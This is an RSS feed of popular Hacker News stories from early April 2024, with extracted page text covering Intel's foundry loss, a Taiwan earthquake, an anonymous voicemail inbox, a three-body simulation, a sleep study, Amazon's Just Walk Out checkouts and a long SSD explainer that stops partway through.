<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Wed, 03 Apr 2024 06:00:04 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Intel discloses $7B operating loss for chip-making unit (112 pts)]]></title>
            <link>https://www.reuters.com/technology/intel-discloses-financials-foundry-business-2024-04-02/</link>
            <guid>39912854</guid>
            <pubDate>Wed, 03 Apr 2024 01:56:34 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.reuters.com/technology/intel-discloses-financials-foundry-business-2024-04-02/">https://www.reuters.com/technology/intel-discloses-financials-foundry-business-2024-04-02/</a>, See on <a href="https://news.ycombinator.com/item?id=39912854">Hacker News</a></p>
Couldn't get https://www.reuters.com/technology/intel-discloses-financials-foundry-business-2024-04-02/: Error: Request failed with status code 401]]></description>
        </item>
        <item>
            <title><![CDATA[7.4 earthquake in Taiwan, 34km depth (362 pts)]]></title>
            <link>https://earthquake.usgs.gov/earthquakes/map/?extent=16.34123,-246.42334&amp;extent=28.51697,-223.43994</link>
            <guid>39912330</guid>
            <pubDate>Wed, 03 Apr 2024 00:24:56 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://earthquake.usgs.gov/earthquakes/map/?extent=16.34123,-246.42334&#x26;extent=28.51697,-223.43994">https://earthquake.usgs.gov/earthquakes/map/?extent=16.34123,-246.42334&#x26;extent=28.51697,-223.43994</a>, See on <a href="https://news.ycombinator.com/item?id=39912330">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
          <p>
            The Latest Earthquakes application supports most recent browsers,
            <a href="https://angular.io/guide/browser-support" target="_blank">view supported browsers</a>.
          </p>
          <p>
            If the application does not load, try our
            <a href="https://earthquake.usgs.gov/legacy/map/" target="_blank"> legacy Latest Earthquakes application</a>.
          </p>
        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Anonymous public voicemail inbox (263 pts)]]></title>
            <link>https://afterthebeep.tel/</link>
            <guid>39910119</guid>
            <pubDate>Tue, 02 Apr 2024 19:49:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://afterthebeep.tel/">https://afterthebeep.tel/</a>, See on <a href="https://news.ycombinator.com/item?id=39910119">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <table>
            <tbody><tr>
                <th>#</th>
                <th>Date</th>
                <th>Length</th>
                <th>Memo</th>
            </tr>
            <tr data-audio="/messages/eb9f7d9fd1584965948ac692fec5548f.mp3">
                <td>22</td>
                <td><time datetime="2024-04-02T17:07:47-04:00">2024/04/02  5:07 PM EDT</time></td>
                <td>0:18</td>
                <td>Whistling a tune</td>
            </tr>
            <tr data-audio="/messages/0760a6e4c9b148ddbf2314dce67eb4e5.mp3">
                <td>21</td>
                <td><time datetime="2024-04-02T17:06:18-04:00">2024/04/02  5:06 PM EDT</time></td>
                <td>0:54</td>
                <td>Kids these days</td>
            </tr>
            <tr data-audio="/messages/8ecaebe50d6de7ab8e720e4f0ac9a04b.mp3">
                <td>20</td>
                <td><time datetime="2024-04-02T17:04:13-04:00">2024/04/02  5:04 PM EDT</time></td>
                <td>0:13</td>
                <td>???</td>
            </tr>
            <tr data-audio="/messages/95f6d1801d9b33f3b2e4de6be660ac44.mp3">
                <td>19</td>
                <td><time datetime="2024-04-02T17:00:31-04:00">2024/04/02  5:00 PM EDT</time></td>
                <td>0:18</td>
                <td>Animals are cool, I like animals</td>
            </tr>
            <tr data-audio="/messages/95b8fb05f9c7666a1ac7c85b88bdf461.mp3">
                <td>18</td>
                <td><time datetime="2024-04-02T16:53:31-04:00">2024/04/02  4:53 PM EDT</time></td>
                <td>0:07</td>
                <td>Your refrigerator is running</td>
            </tr>
            <tr data-audio="/messages/00d017ff07e0a483bbef30dcbcad115c.mp3">
                <td>17</td>
                <td><time datetime="2024-04-02T16:51:46-04:00">2024/04/02  4:51 PM EDT</time></td>
                <td>0:06</td>
                <td>Farewell, toodle-too</td>
            </tr>
            <tr data-audio="/messages/02479d90bce2ba4db18a59eb03225c99.mp3">
                <td>16</td>
                <td><time datetime="2024-04-02T16:51:45-04:00">2024/04/02  4:51 PM EDT</time></td>
                <td>0:07</td>
                <td>Hello world, this is a message</td>
            </tr>
            <tr data-audio="/messages/61a6d21ce3885e16de11813538648456.mp3">
                <td>15</td>
                <td><time datetime="2024-04-02T16:44:25-04:00">2024/04/02  4:44 PM EDT</time></td>
                <td>0:06</td>
                <td>Welcome to planet Earth</td>
            </tr>
            <tr data-audio="/messages/01294a9b6d8dc0fd01051065b54161f4.mp3">
                <td>14</td>
                <td><time datetime="2024-04-02T16:42:50-04:00">2024/04/02  4:42 PM EDT</time></td>
                <td>0:32</td>
                <td>I mean like really steep stairs</td>
            </tr>
            <tr data-audio="/messages/58cd8334b5f40f1b776f5efccd98d5f5.mp3">
                <td>13</td>
                <td><time datetime="2024-04-02T16:35:11-04:00">2024/04/02  4:35 PM EDT</time></td>
                <td>0:02</td>
                <td>Heheh</td>
            </tr>
            <tr data-audio="/messages/e91bbba7e0cfb606c4284f65f1b9d28f.mp3">
                <td>12</td>
                <td><time datetime="2024-04-02T16:32:30-04:00">2024/04/02  4:32 PM EDT</time></td>
                <td>0:12</td>
                <td>Never stop loving yourself, bitch!</td>
            </tr>
            <tr data-audio="/messages/b26373cdb93bda76a3509253a2478e20.mp3">
                <td>11</td>
                <td><time datetime="2024-04-02T16:29:41-04:00">2024/04/02  4:29 PM EDT</time></td>
                <td>0:39</td>
                <td>Hoping for a tornado in a far off field</td>
            </tr>
            <tr data-audio="/messages/1c48b304b3ff23699ed343879a93624d.mp3">
                <td>10</td>
                <td><time datetime="2024-04-02T16:27:14-04:00">2024/04/02  4:27 PM EDT</time></td>
                <td>0:02</td>
                <td>Hack the planet!</td>
            </tr>
            <tr data-audio="/messages/5a665dc2820c31035a9ce7ebf2c4f771.mp3">
                <td>9</td>
                <td><time datetime="2024-04-02T16:14:17-04:00">2024/04/02  4:14 PM EDT</time></td>
                <td>0:34</td>
                <td>This is Jacob calling about your colon</td>
            </tr>
            <tr data-audio="/messages/a6ac5d052d66f93c2677f78fd7c65bb8.mp3">
                <td>8</td>
                <td><time datetime="2024-04-02T16:12:45-04:00">2024/04/02  4:12 PM EDT</time></td>
                <td>0:27</td>
                <td>It’s 1994 calling, things are extreme!</td>
            </tr>
            <tr data-audio="/messages/054f1b0c956dd9c1c97076a76da69ba4.mp3">
                <td>7</td>
                <td><time datetime="2024-04-02T16:11:59-04:00">2024/04/02  4:11 PM EDT</time></td>
                <td>0:40</td>
                <td>Greetings from the Black Sea coast</td>
            </tr>
            <tr data-audio="/messages/8b2e6eda657b499091a8f9458dc33104.mp3">
                <td>6</td>
                <td><time datetime="2024-04-02T16:09:12-04:00">2024/04/02  4:09 PM EDT</time></td>
                <td>0:11</td>
                <td>Tonight I went fishing</td>
            </tr>
            <tr data-audio="/messages/840aa2598e343f1994df081beb66deaa.mp3">
                <td>5</td>
                <td><time datetime="2024-03-31T23:35:28-04:00">2024/03/31 11:35 PM EDT</time></td>
                <td>0:43</td>
                <td>Happy Easter, Jesus</td>
            </tr>
            <tr data-audio="/messages/4422f8d0c1ad3d8203b83e8ef8aeaeda.mp3">
                <td>4</td>
                <td><time datetime="2023-07-08T03:26:49-04:00">2023/07/08  3:26 AM EDT</time></td>
                <td>0:58</td>
                <td>Thank you to Ellie</td>
            </tr>
            <tr data-audio="/messages/03a7a7746e0156dd6e71fe3b0c1fda11.mp3">
                <td>3</td>
                <td><time datetime="2023-07-01T23:06:31-04:00">2023/07/01 11:06 PM EDT</time></td>
                <td>0:23</td>
                <td>Check out <a href="https://bsoa.bandcamp.com/" target="_blank">Blue Skies Over Alaska</a></td>
            </tr>
            <tr data-audio="/messages/51f5e871e4d7d728518d30abf45a8b13.mp3">
                <td>2</td>
                <td><time datetime="2023-05-28T22:46:59-04:00">2023/05/28 10:46 PM EDT</time></td>
                <td>1:23</td>
                <td>Boy, am I overwhelmed</td>
            </tr>
            <tr data-audio="/messages/d3d8766b6f989edbc6353853485c6976.mp3">
                <td>1</td>
                <td><time datetime="2023-05-06T06:17:40-04:00">2023/05/06  6:17 AM EDT</time></td>
                <td>1:01</td>
                <td>Yooooo, I LOVE you dude</td>
            </tr>
        </tbody></table>
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A rudimentary simulation of the three-body problem (140 pts)]]></title>
            <link>https://github.com/achristmascarl/three_body</link>
            <guid>39909123</guid>
            <pubDate>Tue, 02 Apr 2024 18:23:35 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/achristmascarl/three_body">https://github.com/achristmascarl/three_body</a>, See on <a href="https://news.ycombinator.com/item?id=39909123">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">✨ three_body</h2><a id="user-content--three_body" aria-label="Permalink: ✨ three_body" href="#-three_body"></a></p>
<p dir="auto">a very rudimentary simulation of the three-body problem. i was curious how far we could get with just euler's method and a small time step, and it turns out we can get something pretty visually interesting!</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/achristmascarl/three_body/blob/main/three_body.gif"><img src="https://github.com/achristmascarl/three_body/raw/main/three_body.gif" alt="three body problem gif" data-animated-image=""></a></p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/achristmascarl/three_body/blob/main/three_body.png"><img src="https://github.com/achristmascarl/three_body/raw/main/three_body.png" alt="three body problem image"></a></p>
<p dir="auto">i was also curious about what would happen if the polar coordinates of the bodies over time were translated into rgb values and animated; the results are below.</p>
<p dir="auto"><strong>warning</strong>: some of the transitions from this orbit are pretty abrupt, so there may be flashing colors.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/achristmascarl/three_body/blob/main/color.gif"><img src="https://github.com/achristmascarl/three_body/raw/main/color.gif" alt="three body problem color gif" data-animated-image=""></a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">sources</h2><a id="user-content-sources" aria-label="Permalink: sources" href="#sources"></a></p>
<p dir="auto">the starting positions for the graphics above are for periodic orbit F<sub>10</sub> from this paper: <a href="https://arxiv.org/abs/1805.07980" rel="nofollow">https://arxiv.org/abs/1805.07980</a></p>
<p dir="auto">This is what F<sub>10</sub> looks like when solved with ODE solver dop853 (according to the paper):</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/achristmascarl/three_body/blob/main/paper_f10.png"><img src="https://github.com/achristmascarl/three_body/raw/main/paper_f10.png" width="450px" alt="F10 from the paper"></a></p>
<p dir="auto">as you can see, although the overall shape is similar/recognizeable, the error in the calculations above grow fairly noticeable after just 2 periods.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Study uses wearables to show that physical activity lengthens REM latency (126 pts)]]></title>
            <link>https://news.utexas.edu/2024/04/01/move-more-sleep-better-ut-study-finds/</link>
            <guid>39908798</guid>
            <pubDate>Tue, 02 Apr 2024 17:58:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://news.utexas.edu/2024/04/01/move-more-sleep-better-ut-study-finds/">https://news.utexas.edu/2024/04/01/move-more-sleep-better-ut-study-finds/</a>, See on <a href="https://news.ycombinator.com/item?id=39908798">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
              <p>AUSTIN, Texas — A new study by an interdisciplinary team of researchers at The University of Texas at Austin provides the most reliable validation to date of the connection between physical activity, sleep quality and psychological health.</p>
<p>The study found that physical activity lengthened REM latency — that is, the time it takes to enter the REM stage. This may indicate that exercise helps consolidate deeper sleep stages before transitioning into REM sleep, which is when we tend to have vivid dreams and our brains seem to be as active as they are when we’re awake.</p>
<p>Scientific studies backed by anecdotal evidence already testify to the fact that when we exercise regularly, we sleep better. And, when we sleep better, we feel better. Although there is ample scientific evidence to support this, until now the studies have been conducted in lab settings, with conclusions drawn from observing experiences after just one night’s sleep.&nbsp;Such limited methodologies are problematic for any scientific study, regardless of how widely accepted the findings may be.</p>
<p>The <a href="https://www.nature.com/articles/s41598-024-56332-7">study</a>, published in Nature Scientific Reports<em>, </em>investigated how daily physical activity patterns affect sleep stages and emotional well-being in a natural environment — at home, at work and during daily activities — over several months.</p>
<p>The research team used advanced wearable technology to track sleep and activity levels in 82 young adults. A wrist-worn activity tracker recorded both movement and heart rate. From those signals, periods of deep (NREM) sleep&nbsp;and REM sleep, along with physical activity, could be determined. A separate smartphone app was used to collect self-reported well-being data.</p>
<p>The study emerged from a pilot study conducted as part of <a href="https://bridgingbarriers.utexas.edu/whole-communities-whole-health">Whole Communities–Whole Health</a>, a grand challenge research program that takes an interdisciplinary approach to how health care data are collected while also engaging communities and participants in the research process. This more wide-reaching study successfully replicated many of the findings previously conducted in sleep labs: namely, that engaging in both low-intensity and moderate-to-vigorous physical activity was linked to deeper, more restorative sleep, and that better sleep was in turn associated with more energy and less stress the following morning.</p>
<p>The key difference this time was the researchers’ innovative use of wearable technology, which allowed for continuous monitoring of participants’ behaviors, providing a comprehensive picture of daily activities and their impact on sleep and mood over multiple weeks, even months.</p>
<p>“You can learn a lot from lab studies, but obviously there are limitations to studying the sleep patterns of individual participants in just one night,” said <a href="https://liberalarts.utexas.edu/psychology/faculty/bsb57">Benjamin Baird</a>, a research assistant professor of psychology and one of the authors of the study. “It’s an unfamiliar, clinical-type setting, which can be stressful. And you can’t really look over time, either. So, there are always questions about generalizability from that kind of design.”</p>
<p>Baird said that researchers were able to address for the first time how these differences in sleep architecture are associated with people’s perceived well-being. Sleep architecture refers to the structure of each 90- to 120-minute-long sleep cycle: the three stages of non-REM sleep (light, deep and deepest NREM sleep) and REM sleep, which makes up the final 25% or so of each cycle.</p>
<p>“We’ve shown using a standard Fitbit that anyone could wear — not even an expensive scientific device — that it is actually sensitive to these sorts of sleep architecture measures, and in a way that’s showing predictive results,” said <a href="https://liberalarts.utexas.edu/psychology/faculty/dms2529">David M. Schnyer</a>, a co-author and chair of the Department of Psychology. “The world is your oyster now. You can use this device to study all manner of different sleep architecture data related to lifestyle — related to mood and mood disorders — in the field, not in a lab, that people might have thought was not possible previously.”</p>

            </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Amazon Ditches 'Just Walk Out' Checkouts at Its Grocery Stores (375 pts)]]></title>
            <link>https://gizmodo.com/amazon-reportedly-ditches-just-walk-out-grocery-stores-1851381116</link>
            <guid>39908579</guid>
            <pubDate>Tue, 02 Apr 2024 17:39:36 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://gizmodo.com/amazon-reportedly-ditches-just-walk-out-grocery-stores-1851381116">https://gizmodo.com/amazon-reportedly-ditches-just-walk-out-grocery-stores-1851381116</a>, See on <a href="https://news.ycombinator.com/item?id=39908579">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Amazon is phasing out its <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;Internal link&quot;,&quot;https://gizmodo.com/amazon-tests-grocery-store-with-no-checkout-1789683651&quot;,{&quot;metric25&quot;:1}]]" href="https://gizmodo.com/amazon-tests-grocery-store-with-no-checkout-1789683651">checkout-less grocery stores</a></span> with “Just Walk Out” technology, first reported by <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://www.theinformation.com/articles/amazons-grocery-stores-to-drop-just-walk-out-checkout-tech?rc=5xvgzc&quot;,{&quot;metric25&quot;:1}]]" href="https://www.theinformation.com/articles/amazons-grocery-stores-to-drop-just-walk-out-checkout-tech?rc=5xvgzc" target="_blank" rel="noopener noreferrer">The Information</a></span> Tuesday. The company’s senior vice president of grocery stores says they’re moving away from Just Walk Out, which relied on cameras and sensors to track what people were leaving the store with.</p><div data-video-id="195188" data-monetizable="true" data-position="sidebar" data-video-title="Top 5 Shopping Tips for Amazon Prime Day" data-video-blog-id="4" data-video-network="gizmodo" data-video-duration="296" data-playlist="195188,191746,191426" data-current="195188"><div><p>Top 5 Shopping Tips for Amazon Prime Day</p></div><video disablepictureinpicture="" muted="" playsinline="" width="100%" height="100%" crossorigin="anonymous" preload="none"><source data-src="https://vid.kinja.com/prod/195188/195188_240p.mp4" label="240p" type="video/mp4"><source data-src="https://vid.kinja.com/prod/195188/195188_480p.mp4" label="480p" type="video/mp4"><source data-src="https://vid.kinja.com/prod/195188/195188_720p.mp4" label="720p" type="video/mp4"><source data-src="https://vid.kinja.com/prod/195188/195188_1080p.mp4" label="1080p" type="video/mp4"><track kind="captions" label="English" src="https://kinja.com/api/videoupload/caption/20646.vtt" srclang="en"></video><div><ul><li data-label="">Off</li><li data-label="English">English</li></ul></div></div><p>Just over half of Amazon Fresh stores are equipped with Just Walk Out. The technology allows customers to skip checkout altogether by scanning a QR code when they enter the store. Though it seemed completely automated, Just Walk Out relied on more than <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://www.theinformation.com/articles/how-amazons-big-bet-on-just-walk-out-stumbled?rc=5xvgzc&quot;,{&quot;metric25&quot;:1}]]" href="https://www.theinformation.com/articles/how-amazons-big-bet-on-just-walk-out-stumbled?rc=5xvgzc" target="_blank" rel="noopener noreferrer">1,000 people in India watching and labeling videos</a></span> to ensure accurate checkouts. The cashiers were simply moved off-site, and they watched you as you shopped.</p><p>Instead, Amazon is moving towards <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;Internal link&quot;,&quot;https://gizmodo.com/amazons-next-big-bet-on-cashless-shopping-is-a-smart-gr-1844377270&quot;,{&quot;metric25&quot;:1}]]" href="https://gizmodo.com/amazons-next-big-bet-on-cashless-shopping-is-a-smart-gr-1844377270">Dash Carts</a></span>, a scanner and screen that’s embedded in your shopping cart, allowing you to checkout as you shop. These offer a more reliable solution than Just Walk Out. Amazon Fresh stores will also feature self check out counters from now on, for people who aren’t Amazon members.</p><p>“We’re rolling out Amazon Dash Cart, our smart-shopping carts,” said an Amazon spokesperson to Gizmodo. Amazon confirmed this feature is replacing its Just Walk Out technology in existing stores. <br></p><p>Just Walk Out was first <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;Internal link&quot;,&quot;https://gizmodo.com/amazon-tests-grocery-store-with-no-checkout-1789683651&quot;,{&quot;metric25&quot;:1}]]" href="https://gizmodo.com/amazon-tests-grocery-store-with-no-checkout-1789683651">introduced in 2016</a></span>, presenting Amazon’s biggest and boldest innovation in grocery shopping. The technology seemed incredible, but there were some stumbles. It often took hours for customers to receive receipts after leaving the store, largely because offshore cashiers were rewatching videos and assigning items to different customers. The system of scanners and video cameras in each store is also incredibly expensive.</p><p>According to The Information, <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://www.theinformation.com/articles/how-amazons-big-bet-on-just-walk-out-stumbled?rc=5xvgzc&quot;,{&quot;metric25&quot;:1}]]" href="https://www.theinformation.com/articles/how-amazons-big-bet-on-just-walk-out-stumbled?rc=5xvgzc" target="_blank" rel="noopener noreferrer">700 out of 1,000 Just Walk Out sales required human reviewers as of 2022</a></span>. This widely missed Amazon’s internal goals of reaching less than 50 reviews per 1,000 sales. Amazon called this characterization inaccurate, and disputes how many purchases require reviews.</p><p>“The primary role of our Machine Learning data associates is to annotate video images, which is necessary for continuously improving the underlying machine learning model powering,” said an Amazon spokesperson to Gizmodo. However, the spokesperson acknowledged these associates validate “a small minority” of shopping visits when AI can’t determine a purchase. </p><p>Amazon Fresh, the e-commerce giant’s grocery store first launched in 2007, has just over 40 locations around the United States. The company also owns Whole Foods, and many of Amazon Fresh’s experiments are seen as precursors for the large chain.</p><p>The company is reportedly keeping Just Walk Out technology in a small number of Fresh stores in the United Kingdom, and some of its Amazon Go convenience stores. Amazon has also implemented Just Walk Out technology at <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;Internal link&quot;,&quot;https://gizmodo.com/amazon-walk-out-houston-astros-cheaters-payment-ballpar-1848794315&quot;,{&quot;metric25&quot;:1}]]" href="https://gizmodo.com/amazon-walk-out-houston-astros-cheaters-payment-ballpar-1848794315">several ballparks </a></span>around the country. These locations will keep the technology going.</p><p>Amazon is trying to further break into the grocery space to grow into another billion-dollar market. Though it owns Whole Foods, the e-commerce giant still doesn’t compete with food goliaths like Walmart, Costco, and Kroger. Amazon’s push away from expensive tests like Just Walk Out may be a sign the company is looking to further expand its presence as a supermarket.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Everything I know about SSDs (2019) (145 pts)]]></title>
            <link>https://kcall.co.uk/ssd/index.html</link>
            <guid>39908146</guid>
            <pubDate>Tue, 02 Apr 2024 17:06:25 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://kcall.co.uk/ssd/index.html">https://kcall.co.uk/ssd/index.html</a>, See on <a href="https://news.ycombinator.com/item?id=39908146">Hacker News</a></p>
<div id="readability-page-1" class="page"><p>

<div>
<p><span size="+1"><b>March 2019:</b></span>

</p><p><span size="+1"><b>Introduction:</b></span>

</p><p>I started writing this rather long page for my own benefit, when I acquired a upgrade from my old 2006 Win 8 250 gb HDD PC to a Dell Optiflex 3010 with a 128 gb SSD. I never used more than 30 or 40 gb of the system drive, and I'm not a gamer or an avid film or music collector either. Not on a PC anyway. As I played with my new kit the further I went I realised that I knew very little about NAND flash in SSDs, just how SSDs work, how do they read and write and store data, and what sort of trickery do they employ? I can visualise an HDD, writing tiny magnetic patterns on a rotating surface, but SSDs are different, vastly different.

</p><p>There's also quite a few misconceptions about SSDs which seem persistent, and it would be nice to examine them if not perhaps quash a few of them. Perhaps I was guilty of harbouring quite a few misconceptions myself. However it started, this article grew into, shall we say, a mid-level technical discussion. If all you need to know is that SSDs are quiet, reliable, fast, and will work for years, then there's no need to read any further. If however, you think that knowing how to read a 3D TLC NAND flash cell is interesting, then you have little option but to plough on.

</p><p>As much of the detailed information as possible has been sourced from corporate and private technical articles, with quite a lot from Seagate and WD, and the wonderfully named Flash Memory Summit. Some of the conclusions I've made are from just trying to apply what logic I can along with common sense. Such is the complexity of NAND flash controllers, the variance in their methods of operation, and the speed of their development, that trying to comprehend let alone keep up with them is difficult to say the least. I can't say whether what I've written isn't confusing or is even true, but it's more of a guide than a bible. There'll be some repetition too. And it will soon be out of date. 

</p><p>I am obliged to those I have borrowed from, and will also be obliged to those who point out any errors without any reward apart from that of contribution. I've tried to explain what is different with SSDs, and why it is so hard to grasp with our ingrained HDD minds.

</p><p>The first misconception might be the plural of SSD: gramatically it should be, so I'm told, SSDs, but SSD's is almost as commonplace. Here I will stick to one SSD, many SSDs.

</p><p><b>Software and hardware:</b>

</p><p>This article was written in 2019 onwards and deals almost exclusively with NAND flash in the form of pc or laptop storage devices we know as SSDs. I shan't complicate things even more by referring to the ubiquitous flash drive or other NAND flash devices. If significant differences exist I shall try to note them as and when that occurs, but the default is the internal drive. Nowhere here is there anything about flash storage in phones, etc.

</p><p>Most of the detail was produced whilst my PC was running Windows 10 Home, with a fairly modest internal 2.5" WD Green 120 gb SSD. This uses a Silicon Motion SM2258XT controller and four 32 GiB SanDisk 05497 032G 15nm 3D TLC memory chips with an inbuilt SLC cache of unknown capacity. As this article tries to discuss the behaviour of SSDs as a whole it shouldn't matter what host operating or file system is used, but in my case it's Windows and NTFS. Nothing here is specific to a particular brand or type of SSD, it should all be generic. We're really dealing with the principles of SSD operation.

</p><p>The only additional software applications I have used are Piriform's excellent Recuva, which can list both live and deleted files and their cluster allocations, and HexDen (HxD), a very usable and capable hex editor. Recuva is free from www.piriform.com, and HexDen is also free from www.mh-nexus.de. I use the portable versions of both pieces of software.

</p><p>All the conclusions and opinions here are entirely my own work, and any data taken from my own pc. It would be wise to verify, or at least agree with my reasoning, before accepting these words as the truth. Much of this is a simplified explanation of a very complex subject.

</p><p><b>SSD Physical Internals:</b>

</p><p>Poking inside an SSD is something of a disappointment, a small pc board with a few NAND flash chips and a controller chip, lightweight and a little flimsy. As for the software inside the controller, I can only summarise the basic tasks. It seems commonplace that controllers are bought in from external manufacturers, as indeed are the memory chips. SSD controller software is proprietary, very complex and highly guarded, but all controllers have to do basic tasks, even if we don't quite know how. Only those tasks can be discussed here, the very clever tweaks and tricks will have to remain known only to the manufacturer. I'll start with a little groundwork.

</p><p><b>NAND Flash:</b>

</p><p>I wasn't going to delve into the internals of NAND flash, there are enough frankly bemusing articles on Wikipedia for all that. All you really need to know is that NAND (NOT-AND) flash memory stores information in arrays of cells made from floating-gate transistors. The floating gate can either have no charge of electrons, and be in an 'empty' logical state, or be charged with electrons at various voltage thresholds and be in a logical state which represents a value. NAND flash is non-volatile and retains its state even when the SSD is not powered up. Oh yes, it's called flash because a large chunk of cells can be erased (flashed) at a time.

</p><p>But if you want to know more, go ahead. Here the term cell and transistor refer to the same physical entity and are used interchangeably, and I won't keep saying NAND all the time.

</p><p>Flash memory comprises multiple two-dimensional arrays of transistors, and supports three basic operations, read, program (write) and erase. Apart from the flash arrays, the flash chip includes command and status registers, a control unit, decoders, analogue circuits, buffers, and address and data buses. A separate chip holding the SSD controller sends read, program, or erase commands to the flash chip. In a read operation the controller passes the physical address to the flash chip which locates the data and sends it back to the controller. in a program operation the data and physical address are passed to the chip. In an erase operation, only the physical address is passed to the chip.

</p><p>The ﬂash chip's latches store data transferred to and from the flash arrays, and the sense ampliﬁers detect bit line voltages during read operations. The controller monitors the command sent to the chip using the status register. The controller also includes Error Checking and Correction (EEC) algorithms to manage error and reliability issues in the chip and to ensure that correct data is read or written.

</p><p>Each row of an array is connected by a Word line, and each column by a Bit line. At the intersection of a row and column is a Floating Gate Transistor, or cell, where the logical data is stored. Word lines are connected to the transistors in parallel, and bit lines in series. The ends of the bit lines are connected to sense amplifiers.

</p><p>Flash arrays are partitioned into blocks, and blocks are divided into pages. Within a block the cells connected to each word line constitute a page. The cells connected to the bit lines give the number of pages in a block. Common page sizes are 4k, 8k or 16k, with 128 to 256 pages making a block size between 512k and 4mb. A page is the smallest granularity of data that can be addressed by the chip control unit.

</p><p>Read or program operations involve the chip controller selecting the relevant block using the block decoder, then selecting a page in the block using the page decoder. The chip controller is also responsible for activating the correct analogue circuitry to generate the voltages needed for program and erase operations.

</p><p>Although the number of cells in each row is nominally equivalent to the page size, the actual number of cells in each row is higher than the stated capacity of each page. This is because each page contains a set of spare cells as well as data cells. The spare cells store the ECC bits for that page as well as the physical to logical address mapping for the page. The controller may also save additional metadata information about the page in the spare area. During a read operation, the entire page (including the bits in the spare area) is transmitted to the controller. The ECC logic in the controller checks and correct the read data. During a program operation the controller transmits both the user data and the ECC bits to the flash memory.

</p><p>Upon system boot the controller scans the spare area of each page in the entire flash array to load the logical to physical address mapping into its own memory (there may be other techiques for holding mapping data in the controller). The controller holds the logical to physical address mapping in the Flash Translation Layer (FTL). The FTL also performs garbage collection to clear invalid pages following writes, and performs wear-leveling to ensure that all the ﬂash blocks are used, evenly.

</p><p>Since flash does not support in-place updates, a page needs to be erased before its contents can be programmed; but unlike a program or a read operation which work at a page granularity, the erase operation is performed at a block granularity.

</p><p><b>2D and 3D, and Layers:</b>

</p><p>In flash architecture a block of planar flash, a two-dimensional array of cells, is rather unsurprisingly called 2D flash. If one (or more) array is stacked on top of each other then it's 3D flash. 3D NAND flash is built on one chip, up to 32 layers, and was devised to drive costs down when planar flash reached its scaling limit: 3D flash costs little more than 2D to produce, but multiplies the storage capacity immensely. In both 2D and 3D the cells in each page (the rows) are connected by Word Lines, and the cells at each offset within a page (the columns) are connected with a Bit Line (to put it very simply).

</p><p>3D flash is not the same as layered flash, where separate very thin chips are arranged in a stack. This is prohibitively expensive. Most modern consumer SSDs (in the 2010's) use 3D TLC flash.

</p><p><b>Can I see one?</b>

</p><p>The cell size on end-user flash is minute, with 15nm being common, and ranges from 43nm down to 12nm. Actually cell size, or cell diameter, is misleading, as the stated size is not a measurement of any dimension of a cell but a measure of the distance between discrete components on the chip. The silicon layers on the chip are approximately 0.5 to 3nm thick: by comparison a hydrogen atom is 0.1nm in diameter, and the silicon atoms used in chip manufacture 0.2nm. A nanometre (nm) is indeed exceedingly small, a billionth of a metre, and as an analogy if one mn were the size of a standard marble (about 13mm) then one metre would be the size of the earth. The power of a billion is impressive.

</p><p><b>SLC, MLC, TLC, QLC and Beyond:</b>

</p><p>A Single-Level Cell (SLC) has one threshold of electron charge to indicate the state of one bit, one or zero. A Multi-Level Cell (MLC) holds a voltage denoting the state of two bits, with three different thresholds representing 11, 10, 00 and 01. A Triple-Level Cell (TLC) holds the state of three bits, 111, 110, 100, 101, 001, 000, 010, and 011. The 15 thresholds used in Quad-level cells (QLC) can be deduced if anyone is at all interested. (I have seen other variations of what these threshold values represent in bit terms.)

</p><p>Unfortunately when the double level cell was developed it was called a multi-level cell and given the acronym MLC, thus forcing everyone to type out multi-level cell laboriously when they want to refer to multiple level cells. If only it had been called a double-level cell we could use DLC, TLC, and QLC freely and use MLC to describe the lot, but it's too late for that now. If only flash had stopped at SLC, with its yes/no one/zero state, these explanations would be far easier to write, and hopefully far easier to grasp.

</p><p>With multi-level cells physical NAND pages represent two or more logical pages. The two bits belonging to a MLC are separately mapped to two logical pages. Odd numbered pages (including zero) are mapped to the least significant (RH) bit, and even numbered pages are mapped to the most significant (LH) bit. Similarly, the three bits belonging to a TLC are separately mapped to three logical pages, and a QLC is mapped to four logical pages (The page numbering for TLC and QLC is unknown).

